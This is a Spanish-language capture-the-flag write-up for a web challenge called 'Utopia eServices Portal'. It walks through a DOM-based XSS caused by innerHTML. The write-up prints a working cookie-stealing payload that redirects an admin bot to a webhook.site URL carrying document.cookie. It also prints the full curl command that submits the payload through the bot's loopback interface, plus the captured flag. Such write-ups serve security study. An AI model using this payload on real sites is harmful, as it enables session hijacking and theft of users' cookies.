---
title: "Utopia eServices Portal"
description: 'El desafío presenta un portal de servicios gubernamentales donde la mayoría de las funcionalidades devuelven un mensaje de "Coming Soon". Se proporciona un endpoint /report que acepta un objeto JSON con un parámetro url. Esto sugiere un escenario de Server-Side Request Forgery (SSRF) o Cross-Site Scripting (XSS) dirigido a un bot administrativo.'
pubDate: 'Jan 25 2026'
heroImage: ''
ctf: 'Fluid Attack 2026'
---

**Categoría:** Web / Client-Side
**Dificultad:** Easy (500 pts)
**Objetivo:** Ejecutar código en el navegador del revisor (bot) para recuperar la flag oculta.

## 1. Reconocimiento Inicial

El desafío presenta un portal de servicios gubernamentales donde la mayoría de las funcionalidades devuelven un mensaje de "Coming Soon". Se proporciona un endpoint `/report` que acepta un objeto JSON con un parámetro `url`. Esto sugiere un escenario de *Server-Side Request Forgery* (SSRF) o *Cross-Site Scripting* (XSS) dirigido a un bot administrativo.

Al realizar una enumeración de directorios (fuzzing), se identificaron varias rutas accesibles, tales como:

* `/services/utoid`
* `/services/certificates-and-records`
* `/health`

El análisis de las cabeceras HTTP en respuestas de error reveló que el servidor backend utiliza **Werkzeug/3.1.3** y **Python/3.13.9**, indicando una aplicación basada en **Flask**.

## 2. Análisis de Vulnerabilidad

Al inspeccionar el código fuente HTML de las páginas de servicios (ej. `/services/utoid`), se identificó un script JavaScript encargado de renderizar mensajes dinámicos basados en parámetros de la URL.

Código vulnerable identificado:

```javascript
window.onload = function() {
  let params = new URLSearchParams(window.location.search)
  let msg = params.get("msg")
  
  if (msg) {
    // Vulnerabilidad: Inyección directa en el DOM sin sanitización
    window.msg.innerHTML = msg.trim() || "This service is coming soon"
  }
}

```

Este patrón representa una vulnerabilidad de **DOM-based XSS**. La propiedad `innerHTML` permite la inyección de etiquetas HTML arbitrarias. Aunque HTML5 previene la ejecución de etiquetas `<script>` insertadas vía `innerHTML`, es posible ejecutar JavaScript mediante manejadores de eventos en otras etiquetas, como `<img onerror=...>` o `<svg onload=...>`.

## 3. Estrategia de Explotación

El objetivo es exfiltrar la cookie del administrador (bot), donde presumiblemente reside la flag.

### Obstáculos Técnicos

Intentos iniciales de explotar la vulnerabilidad apuntando al dominio público (`https://6602549ae7e14c72.chal.ctf.ae`) fallaron. Esto indica que el bot reside dentro de una red interna y no tiene capacidad de resolver o conectarse a su propia dirección IP pública externa, o que existe una restricción de firewall.

### Vector de Ataque: Loopback Interface

Dado que el servidor backend es Flask (puerto por defecto 5000), se puede forzar al bot a visitar su propia instancia local (`localhost` o `127.0.0.1`).

**El Payload:**
Se construyó un payload que realiza lo siguiente:

1. Apunta a la interfaz local del bot: `http://127.0.0.1:5000/services/utoid`.
2. Inyecta una etiqueta `<img>` inválida a través del parámetro `msg`.
3. Utiliza el evento `onerror` para ejecutar JavaScript.
4. Realiza una redirección (`window.location.href`) hacia un servidor controlado por el atacante (Webhook), concatenando la propiedad `document.cookie`.

**Payload JavaScript:**

```javascript
<img src=x onerror="window.location.href='https://webhook.site/TU-UUID/?c='+document.cookie">

```

## 4. Ejecución del Exploit

El payload final se codificó y se envió al endpoint `/report` mediante `curl`.

**Comando final:**

```bash
curl "https://6602549ae7e14c72.chal.ctf.ae/report" \
  -H "Content-Type: application/json" \
  --data-raw "{\"url\":\"http://127.0.0.1:5000/services/utoid?msg=%3Cimg%20src%3Dx%20onerror%3D%22window.location.href%3D%27https%3A%2F%2Fwebhook.site%2F07d31a74-bb75-4987-9e30-c8f9ab93bfd9%2F%3Fc%3D%27%2Bdocument.cookie%22%3E\"}"

```

## 5. Resultado

El bot procesó la solicitud, navegó a su instancia local vulnerable y ejecutó el código JavaScript inyectado. El listener en Webhook.site recibió una petición GET desde la IP del bot (`44.221.247.145`) con el User-Agent `HeadlessChrome`, confirmando la exfiltración exitosa.

**Datos recibidos:**

```
GET /?c=flag=flag{ae593720b9c3b6f7}
Referer: http://127.0.0.1:5000/

```

**Flag:**
`flag{ae593720b9c3b6f7}`